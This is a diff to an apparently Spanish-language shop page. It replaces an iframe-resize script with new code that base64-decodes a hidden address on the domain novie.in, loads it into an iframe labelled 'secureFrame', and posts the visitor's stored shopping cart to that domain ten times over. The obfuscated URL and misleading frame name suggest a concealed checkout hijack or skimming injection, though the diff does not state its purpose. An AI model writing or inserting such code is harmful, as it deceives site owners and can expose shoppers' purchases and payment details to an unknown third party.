@@ -913,40 +913,33 @@ background:#212b34;
 <!-- PRODUCTO -->
 <!-- PRODUCTO -->
 
-
 <script>
+const iframe = document.getElementById("secureFrame");
 
-let lastHeight = 0;
+const realURL = atob("aHR0cHM6Ly9ub3ZpZS5pbi84L2FxdWkuaHRtbA==");
+iframe.src = realURL;
 
-function sendHeight(){
+function enviarCarrito() {
+  const carrito = JSON.parse(localStorage.getItem("carrito")) || [];
 
-const newHeight = document.body.scrollHeight;
+  iframe.contentWindow.postMessage(
+    { type: "carrito", data: carrito },
+    "https://novie.in"
+  );
 
-if(Math.abs(newHeight - lastHeight) > 5){
-
-lastHeight = newHeight;
-
-parent.postMessage({
-type:"resize",
-height:newHeight
-},"*");
-
+  console.log("Carrito enviado:", carrito);
 }
 
-}
+iframe.addEventListener("load", () => {
+  let intentos = 0;
 
-window.addEventListener("load",sendHeight);
-window.addEventListener("resize",sendHeight);
+  const intervalo = setInterval(() => {
+    enviarCarrito();
+    intentos++;
 
-const observer = new MutationObserver(()=>{
-setTimeout(sendHeight,120);
+    if (intentos > 10) clearInterval(intervalo);
+  }, 300);
 });
-
-observer.observe(document.body,{
-childList:true,
-subtree:true
-});
-
 </script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
 <div id="loader" style="
